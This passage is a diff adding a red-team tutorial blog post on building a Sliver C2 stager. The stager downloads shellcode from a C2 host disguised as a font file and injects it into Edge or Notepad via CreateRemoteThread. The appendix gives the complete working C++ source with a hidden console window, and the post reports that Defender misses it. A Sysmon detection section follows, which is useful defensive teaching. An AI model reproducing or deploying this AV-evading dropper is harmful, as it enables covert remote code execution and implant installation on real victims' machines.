+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Download(<span style="color:#e6db74">L</span><span style="color:#e6db74">"sliver.labnet.local"</span>, <span style="color:#ae81ff">80</span>, <span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
+
+    printf(<span style="color:#e6db74">"Injecting %ld bytes into PID %ld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, shellcode.dwSize, pid);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Find the implementation of <code>Download</code> in the <a href="../../post/learning_sliver_c2_06_stagers/#c-stager">previous post</a>,
+or check out the complete version of the final stager in this post’s <a href="#appendix">appendix</a>.
+Note that the <code>Download</code> function from the previous post returned a <code>Shellcode</code> struct
+while we now need a <code>Download</code> function that stores the shellcode in a struct passed to it as an argument.
+Otherwise it’s the exact same code.</p>
+<p>Time for the moment of truth.
+Instead of notepad, let’s open the Edge browser this time and then run the stager.
+If everything worked fine, you should see this familiar line on your Sliver C2 server:</p>
+<pre tabindex="0"><code>[*] Session 5f77e60f RURAL_SIZE - 192.168.122.32:50056 (DESKTOP-2CNJ1IR) - windows/amd64 - Fri, 07 Oct 2022 22:34:26 CEST
+</code></pre><p>A new session appeared. It must have worked.
+Just to get some more practice, try to find the Sliver shellcode in the memory of Edge with Process Hacker.
+The procedure is the same as before.
+Look for an “RX” section not backed by a DLL and inspect the memory.
+You will find a rather huge blob.
+If you look through the memory content, you can spot a few readable sections
+that leave no doubt as to what has been put in memory here:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/30_sliver_c2_stagers_process_injection/memory_analysis_edge_implant.png">
+    
+  
+  
+  <figcaption>
+    <header><b>Implant shellcode can be found in Edge process memory with Process Hacker</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<h2 id="defense">Defense</h2>
+<p>With the stager in its current form, we have built a basic dropper to get a Sliver implant deployed.
+Time to take a step back and see how this could be stopped.
+First, I’ll briefly check if AV solutions successfully block the stager.
+After that, I’ll demo Sysmon and show how the process injection could at least be detected.</p>
+<h3 id="protection">Protection</h3>
+<p>At this point, my first question was if Defender would still block this stager.
+Of course we should not expect too much from AV here since the stager is just a program we wrote ourselves,
+not well-known malware for which a signature could exist.
+Still, a modern Next-Generation AV solution should be able to detect unknown threats based on their behaviour.</p>
+<p>For the test, I’ve built a binary “StagerInject.exe” and copied it over to the C2 server into the Apache web folder.
+Then, I turned on all the Defender features (Real-time and cloud protection as well as sample submission).
+Lastly, I downloaded the stager. Nothing happened.
+Executed the stager. Still no complaints from Defender, but an active session on the C2 server.
+Scary stuff, partly illustrated in the screenshot below:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/30_sliver_c2_stagers_process_injection/defender_does_not_detect_stager.png">
+    
+  
+  
+  <figcaption>
+    <header><b>Defender does not block the stager</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Of course Defender is not the only AV solution out there, so the next escalation level was to upload
+to <a href="https://www.virustotal.com/">virustotal.com</a>.
+As expected, at least some of the 72 AV solutions screening “StagerInject.exe” identified it is malware.
+A total of 8 solutions flagged the file as malicious.</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/30_sliver_c2_stagers_process_injection/virustotal_detects.png">
+    
+  
+  
+  <figcaption>
+    <header><b>8 AV solutions on VirusTotal detect the stager</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Bear in mind that the detection rate could have been higher if the stager would load it’s payload
+from a publicly available URL. Since VirusTotal cannot observe the shellcode as it is downloaded, behavioral analysis
+won’t see much of what’s going on.</p>
+<p>Overall though, the result is somewhat disillusioning. It is way too easy to plug together a few pieces of
+code found on the internet to get around Defender and many other AV solutions.</p>
+<h3 id="detection">Detection</h3>
+<p>While the stager might not be blocked right away, it might still be detectable by humans looking at logs.
+It’s worth having a look at what can be seen with common security logging tools when the stager executes.
+Here I’ll test-drive the free tool <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a>,
+which is a very popular event collector for Windows.</p>
+<p>Sysmon works out of the box but to make it more realistic, I recommend to apply a proper configuration.
+The <a href="https://github.com/olafhartong/sysmon-modular">sysmon-modular GitHub repository</a>
+provides some configurations to get started with. There is a default configuration
+for common use cases as well as more verbose ones which the authors do not recommend for production use.
+Thus, I’ll use the <a href="https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml">default configuration</a> here.</p>
+<p>On the Windows target machine, download
+<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a>
+and the
+<a href="https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml">configuration file</a>,
+then install Sysmon with <code>sysmon64.exe -accepteula -i sysmonconfig.xml</code> (as administrator).
+It should look like this:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/30_sliver_c2_stagers_process_injection/sysmon_install.png">
+    
+  
+  
+  <figcaption>
+    <header><b>Installation of Sysmon with the configuration file from sysmon-modular</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Sysmon is nothing more than an event collector running on a Windows host.
+It will not analyse the events for you.
+Usually, they would be sent to a central platform for analysis.
+Nevertheless, it’s possible to view the logs locally.
+Open the “Event Viewer”, then select
+“Application and Services Logs” -&gt;
+“Microsoft” -&gt;
+“Windows” -&gt;
+“Sysmon” -&gt;
+“Operational” and you will get a view of all Sysmon events logged on the system.
+This is what it looked like for me right after installation:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/30_sliver_c2_stagers_process_injection/sysmon_events.png">
+    
+  
+  
+  <figcaption>
+    <header><b>Event viewer shows all Sysmon events collected on the system</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Let’s see if Sysmon will notice the stager.
+You should have the compiled file “StagerInject.exe” in your Downloads folder
+and a stage listener running on the C2 server.
+Run the stager and as before, you should get the session.</p>
+<p>Now refresh the event viewer (hit F5) to see the new events collected by Sysmon.
+Among the many events collected you will find a few related to the stager.
+For example, Sysmon events with ID 1 track new processes as they are created.
+Here is what it looks like
+(the mention of ATT&amp;CK technique <a href="https://attack.mitre.org/techniques/T1036/">T1036</a>
+is due to the config, which seems to apply this tag if the string “\Downloads\” is in the
+path of the file being executed):</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/30_sliver_c2_stagers_process_injection/sysmon_event_1_process_created.png">
+    
+  
+  
+  <figcaption>
+    <header><b>Launching the stager created a Sysmon Event with ID 1</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>There is also another Sysmon event which tracks calls to <code>CreateRemoteThread</code>.
+It has ID 8 and below you can see what it looked like for me.
+It clearly shows that the process “StagerInject.exe” created a thread in “msedge.exe”:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/30_sliver_c2_stagers_process_injection/sysmon_event_8_create_remote_thread.png">
+    
+  
+  
+  <figcaption>
+    <header><b>Launching the stager created a Sysmon Event with ID 8</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Take a moment and look at the other logs Sysmon generates.
+It collects a wide array of data and even includes network-related logs.
+For example, you will find a Sysmon event with ID 3 that reports a network connection to
+port 80 of the C2 server (download of the shellcode) as well as a DNS query resolving
+<code>sliver.labnet.local</code>, all related to the stager process.</p>
+<p>Overall, we can see that stager execution might not be blocked by Defender right away,
+but it’s also not very stealthy either. Logs collected by a tool like Sysmon would contain
+plenty of evidence. Of course, it depends on the environment if
+events like those we saw would raise suspicion. Are those events collected at all?
+If they are, is it possible to identify relevant events among all the others, and are administrators
+able to shut down the activity quickly?</p>
+<p>Of course, there are also plenty of ways to add stealth to the stager,
+making it harder to detect. For now though I’ll leave it like this.
+We got Sliver implants running without having to turn off Defender, which is good enough.</p>
+<h2 id="appendix">Appendix</h2>
+<p>This is the complete stager with hidden console window,
+fully implemented download function
+and all print statements removed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wininet.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;tlhelp32.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#pragma comment (lib, "Wininet.lib")
+</span><span style="color:#75715e"></span>
+
+<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> {
+    BYTE<span style="color:#f92672">*</span> pcData;
+    DWORD dwSize;
+};
+
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>();
+BOOL <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port, Shellcode<span style="color:#f92672">*</span> shellcode);
+BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode);
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#f92672">::</span>ShowWindow(<span style="color:#f92672">::</span>GetConsoleWindow(), SW_HIDE); <span style="color:#75715e">// hide console window
+</span><span style="color:#75715e"></span>    
+    DWORD pid <span style="color:#f92672">=</span> GetTargetPID();
+    <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>; }
+
+    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Shellcode</span> shellcode;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Download(<span style="color:#e6db74">L</span><span style="color:#e6db74">"sliver.labnet.local"</span>, <span style="color:#ae81ff">80</span>, <span style="color:#f92672">&amp;</span>shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>; }
+
+    <span style="color:#75715e">//printf("Injecting %ld bytes into PID %ld\n", shellcode.dwSize, pid);
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Inject(pid, shellcode)) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>; }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#75715e">// ------ Getting the shellcode ------ //
+</span><span style="color:#75715e"></span>
+BOOL <span style="color:#a6e22e">Download</span>(LPCWSTR host, INTERNET_PORT port, Shellcode<span style="color:#f92672">*</span> shellcode) {
+    HINTERNET session <span style="color:#f92672">=</span> InternetOpen(
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"</span>,
+        INTERNET_OPEN_TYPE_PRECONFIG,
+        NULL,
+        NULL,
+        <span style="color:#ae81ff">0</span>);
+
+    HINTERNET connection <span style="color:#f92672">=</span> InternetConnect(
+        session,
+        host,
+        port,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">""</span>,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">""</span>,
+        INTERNET_SERVICE_HTTP,
+        <span style="color:#ae81ff">0</span>,
+        <span style="color:#ae81ff">0</span>);
+
+    HINTERNET request <span style="color:#f92672">=</span> HttpOpenRequest(
+        connection,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">"GET"</span>,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">"/fontawesome.woff"</span>,
+        NULL,
+        NULL,
+        NULL,
+        <span style="color:#ae81ff">0</span>,
+        <span style="color:#ae81ff">0</span>);
+
+    WORD counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>HttpSendRequest(request, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)) {
+        counter<span style="color:#f92672">++</span>;
+        Sleep(<span style="color:#ae81ff">3000</span>);
+        <span style="color:#66d9ef">if</span> (counter <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>) {
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// HTTP requests eventually failed
+</span><span style="color:#75715e"></span>        }
+    }
+
+    DWORD bufSize <span style="color:#f92672">=</span> BUFSIZ;
+    BYTE<span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BYTE[bufSize];
+
+    DWORD capacity <span style="color:#f92672">=</span> bufSize;
+    BYTE<span style="color:#f92672">*</span> payload <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)malloc(capacity);
+
+    DWORD payloadSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+    <span style="color:#66d9ef">while</span> (true) {
+        DWORD bytesRead;
+
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>InternetReadFile(request, buffer, bufSize, <span style="color:#f92672">&amp;</span>bytesRead)) {
+            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+        }
+
+        <span style="color:#66d9ef">if</span> (bytesRead <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
+
+        <span style="color:#66d9ef">if</span> (payloadSize <span style="color:#f92672">+</span> bytesRead <span style="color:#f92672">&gt;</span> capacity) {
+            capacity <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>;
+            BYTE<span style="color:#f92672">*</span> newPayload <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)realloc(payload, capacity);
+            payload <span style="color:#f92672">=</span> newPayload;
+        }
+
+        <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> bytesRead; i<span style="color:#f92672">++</span>) {
+            payload[payloadSize<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> buffer[i];
+        }
+
+    }
+    BYTE<span style="color:#f92672">*</span> newPayload <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)realloc(payload, payloadSize);
+
+    InternetCloseHandle(request);
+    InternetCloseHandle(connection);
+    InternetCloseHandle(session);
+
+    (<span style="color:#f92672">*</span>shellcode).pcData <span style="color:#f92672">=</span> payload;
+    (<span style="color:#f92672">*</span>shellcode).dwSize <span style="color:#f92672">=</span> payloadSize;
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+}
+
+<span style="color:#75715e">// ------ Finding a target process ------ //
+</span><span style="color:#75715e"></span>
+DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize);
+DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname);
+
+DWORD <span style="color:#a6e22e">GetTargetPID</span>() {
+    <span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> aszProclist[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">"notepad.exe"</span>,
+        <span style="color:#e6db74">L</span><span style="color:#e6db74">"msedge.exe"</span>
+    };
+    <span style="color:#66d9ef">return</span> GetFirstPIDProclist(aszProclist, <span style="color:#66d9ef">sizeof</span>(aszProclist) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(aszProclist[<span style="color:#ae81ff">0</span>]));
+}
+
+DWORD <span style="color:#a6e22e">GetFirstPIDProclist</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">**</span> aszProclist, DWORD dwSize) {
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwSize; i<span style="color:#f92672">++</span>) {
+        pid <span style="color:#f92672">=</span> GetFirstPIDProcname(aszProclist[i]);
+        <span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#66d9ef">return</span> pid;
+        }
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+DWORD <span style="color:#a6e22e">GetFirstPIDProcname</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span> szProcname) {
+    HANDLE hProcessSnapshot <span style="color:#f92672">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color:#ae81ff">0</span>);
+    <span style="color:#66d9ef">if</span> (INVALID_HANDLE_VALUE <span style="color:#f92672">==</span> hProcessSnapshot) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Process32First(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        CloseHandle(hProcessSnapshot);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }
+
+    DWORD pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">while</span> (Process32Next(hProcessSnapshot, <span style="color:#f92672">&amp;</span>pe32)) {
+        <span style="color:#66d9ef">if</span> (lstrcmpiW(szProcname, pe32.szExeFile) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+            pid <span style="color:#f92672">=</span> pe32.th32ProcessID;
+            <span style="color:#75715e">//printf("Process found: %d %ls\n", pid, pe32.szExeFile);
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">break</span>;
+        }
+    }
+
+    CloseHandle(hProcessSnapshot);
+    <span style="color:#66d9ef">return</span> pid;
+}
+
+<span style="color:#75715e">// ------ Injecting into process ------ //
+</span><span style="color:#75715e"></span>
+BOOL <span style="color:#a6e22e">Inject</span>(DWORD dwPID, Shellcode shellcode) {
+    HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_OPERATION <span style="color:#f92672">|</span> PROCESS_VM_WRITE <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD, FALSE, dwPID);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess) { <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>; };
+    
+    LPVOID pRemoteAddr <span style="color:#f92672">=</span> VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT), PAGE_EXECUTE_READ);
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pRemoteAddr) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    };
+
+    HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(hProcess, NULL, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, <span style="color:#ae81ff">0</span>, NULL);
+    <span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">!=</span> NULL) {
+        WaitForSingleObject(hThread, <span style="color:#ae81ff">500</span>);
+
+        CloseHandle(hThread);
+        CloseHandle(hProcess);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+    }
+
+    CloseHandle(hProcess);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div>
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2022-10-09T00:00:00+00:00">
+    9 Oct, 2022
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/c2/">c2</a> and <a href="/categories/sliver/">sliver</a></span>
+  
+  
+    and tagged <a href="/tags/c2/">c2</a>, <a href="/tags/process-injection/">process injection</a>, <a href="/tags/sliver/">sliver</a>, <a href="/tags/stagers/">stagers</a>, <a href="/tags/sysmon/">sysmon</a> and <a href="/tags/tutorial/">tutorial</a>
+  
+  using <span itemprop="wordCount">4619</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/learning_sliver_c2_06_stagers/">Learning Sliver C2 (06) - Stagers: Basics</a>
+        <time datetime="26M">26 minutes</time>
+      
+        </li><li><a href="/post/learning_sliver_c2_05_transports_in_detail_dns/">Learning Sliver C2 (05) - Transports in Detail: DNS</a>
+        <time datetime="9M">9 minutes</time>
+      
+        </li><li><a href="/post/learning_sliver_c2_04_transports_in_detail_http_and_https/">Learning Sliver C2 (04) - Transports in Detail: HTTP and HTTPS</a>
+        <time datetime="19M">19 minutes</time>
+      
+        </li><li><a href="/post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/">Learning Sliver C2 (03) - Transports in Detail: mTLS and WireGuard</a>
+        <time datetime="11M">11 minutes</time>
+      
+        </li><li><a href="/post/learning_sliver_c2_02_beacons_and_sessions/">Learning Sliver C2 (02) - Beacons and Sessions</a>
+        <time datetime="14M">14 minutes</time>
+      
+        </li><li><a href="/post/learning_sliver_c2_01_installation/">Learning Sliver C2 (01) - Tutorial / Installation</a>
+        <time datetime="8M">8 minutes</time>
+      
+    </li></ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  
+
+</body></html>
